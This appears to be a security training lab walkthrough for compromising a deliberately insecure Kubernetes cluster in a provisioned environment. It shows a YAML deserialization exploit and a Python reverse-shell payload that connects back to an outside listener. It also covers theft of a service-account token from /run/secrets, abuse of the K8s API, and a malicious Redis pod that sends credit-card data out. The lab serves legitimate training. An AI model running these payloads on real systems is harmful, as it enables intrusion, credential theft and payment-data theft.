# **Attacking a K8s Cluster**

### * *

-------

#### Step 1:

* Navigate to the `K8s-Cluster-Attack` directory on the provisioned server.

```
cd /root/container_training/Kubernetes/K8s-Cluster-Attack
```

* Multiplex terminal session with `tmux` and split panes horizontally.

```
tmux

tmux split-window -v
```

-------

#### Step 2:

* Setup the insecure cluster and start the flask stack to be run on the cluster. Wait for the command to complete.

```commandline
./setup_insecure_kube.sh

./setup_flask_stack.sh
```

* Verify that the flask stack is running and make sure the `Status` is `Running`

```commandline
kubectl get pods
```

* Check for running services. You should see `ngflask-redis-service` and its `ClusterIP`. 

```commandline
kubectl get svc
```

-------

#### Step 3:

* Set the URL of `ngflask-redis` as an Environment variable

```commandline
NGFLASK=http://$(kubectl get svc ngflask-redis-service -o yaml | grep "clusterIP" |awk '{print $2}')

echo $NGFLASK
```

* Check if the service is running correctly. It should respond with `Please POST JSON requests to this URL`.

```commandline
curl -XGET $NGFLASK
```

-------

#### Step 4:

* Generate a few artifacts by creating transactions on the Application

```commandline
curl -XGET $NGFLASK/generate
```

### *It should return with the following response*

### *`{"success": "10 transactions generated successfully"}`*


* Check the latest transaction that has been logged by our app

```commandline
curl -XGET $NGFLASK/status
```

### *It should come back with a response that looks similar to the one below*

```html
<html>
<head>
    <title>Latest Record</title>
</head>
<body>
  <h2>Latest Transaction Status</h2>

      <h3>amount: 430</h3>

      <h3>name: Cynthia Robinson</h3>

      <h3>card: ********9238</h3>

      <h3>expiration: 1227</h3>

      <h3>Status: Success</h3>
</body>
</html>
```

-------

#### Step 5:

### *Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉*

### *Exploiting a Deserialization Flaw*

#### *Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.*

#### *Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.*

* Navigate to `payloads` directory that has malicious yaml files

```commandline
cd /root/container_training/Kubernetes/K8s-Cluster-Attack/payloads
```

* Upload a malicious yaml file and identify the flaw

```commandline
http --form POST $NGFLASK/upload file@test_payment.yml
```

### *It should come back with a response similar to the one below*

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Thu, 03 Jan 2019 14:35:30 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

* Verify if the malicious transaction that was generated.

```commandline
curl -XGET $NGFLASK/status
```

### *You should see a dump of all Environment variables on the container.*

-------

#### Step 6:

* Fetch the IP of the provisioned server

```commandline
serverip
```

* In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `<serverip>` with value of `serverip` fetched in the previous step.

```commandline
sed -i -e 's/Server_IP_Here/<serverip>/g' reverse_shell.yml
```

**EXAMPLE**: `sed -i -e 's/Server_IP_Here/104.1.1.1/g' reverse_shell.yml`

* Check the file to confirm the changes made

```commandline
cat reverse_shell.yml
```

**EXAMPLE**: `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"104.1.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`

-------

#### Step 7:

* Switch to the lower panel and start the `netcat` listener on port `1337`

```commandline
# Switches to the lower panel
ctrl + b + (lower arrow key)

nc -l 1337
```

* Go to the upper pane and post the malicious `reverse_shell.yml` file

```commandline
# Switches to the upper pane
ctrl + b + (upper arrow key)

http --form POST $NGFLASK/upload file@reverse_shell.yml
```

### *It should come back with a response similar to the one below*

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Thu, 03 Jan 2019 14:38:49 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

### *On the tab running netcat, you should have gotten a netcat reverse TCP shell! The output on the tab running `netcat` will be similar to the one below.*

```
nc -l 1337
/bin/sh: can't access tty; job control turned off
/app #
```

### *Now you can interact with your target app and backend K8s cluster*

### **NOTE: Do NOT use the `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do `Step 6`**

-------

#### Step 8:

* In the reverse shell, navigate within the pod to fetch `Service Account` token.

```commandline
# Switches to the lower panel
ctrl + b + (lower arrow key)

cd /run/secrets/kubernetes.io/serviceaccount

export TOKEN=$(cat token)
```

### *We are now going to masquerade with the cluster-admin's token.*

* Start interacting with K8s API. To get a JSON dump of all pods running, run

```commandline
curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure
```

* Fetch the `clusterIP` of `redis-service` and note the value. 

```commandline
curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure | grep -E '("redis-service"|clusterIP)'
```

### *The response will be similar to the one below. Please note that the IP may differ*

```
        "clusterIP": "10.96.0.1",
        "clusterIP": "10.98.196.52",
        "name": "redis-service",
        "clusterIP": "10.97.43.203", # This is the MASTERHOST IP of Redis
```

* On your machine, copy the following JSON value and make the following changes:
    
    * Change `Redis-Service-ClusterIP-HERE` with the value of redis-service `clusterIP`.
    
    * Change `SERVERIP-HERE` with that of Server IP that can be fetched by running `serverip`

```
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              {
                "name": "MASTERHOST",
                "value": "Redis-Service-ClusterIP-HERE"
              },
              {
                "name": "MASTERPORT",
                "value": "6379"
              },
              {
                "name": "LISTENER_IP",
                "value": "SERVERIP-HERE"
              },
              {
                "name": "LISTENER_PORT",
                "value": "9090"
              }
            ]
        }]
    }
}
EOF
```

* In the reverse shell, if the `pwd` is `/run/secrets/kubernetes.io/serviceaccount` you will have to navigate to the `tmp` directory. 

```commandline
cd /tmp
```

### *root user of the pod will not have permission to create/edit files in `/run/secrets/kubernetes.io/serviceaccount`*

-------

#### Step 9:

* Copy the edited JSON from the previous step and paste it in `/tmp` directory.

**EXAMPLE**:

```bash
# Copy the JSON value you edited, please don't copy the one below
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              ... 
              ...
              ...
              ...
              }
            ]
        }]
    }
}
EOF
```

* Check if `mal-redis.json` has been created in '/tmp/'

```commandline
ls
```

* Create the `malicious-redis` pod

```commandline
curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure
```

-------

#### Step 10:

* Switch to the upper pane, navigate to the `K8s-Cluster-Attack` directory and setup the listener

```commandline
ctrl + b + (upper arrow key)

cd /root/container_training/Kubernetes/K8s-Cluster-Attack

./tornado_server.py
```

### *You should now see all the credit-card details being posted to the listener from the malicious redis pod*

-------

#### Step 11:

* Stop the listener, pods and services that were created

```commandline
# Stop the listener
crtl + c

cd /root/container_training/Kubernetes/K8s-Cluster-Attack

kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis-deployment.yml
```

* Check if other `pods` or `configmaps` are on the cluster and delete them

```commandline
kubectl get pods

kubectl delete pod mal-redis

kubectl delete configmap nginx-config
```

---------

### Reading Material/References:
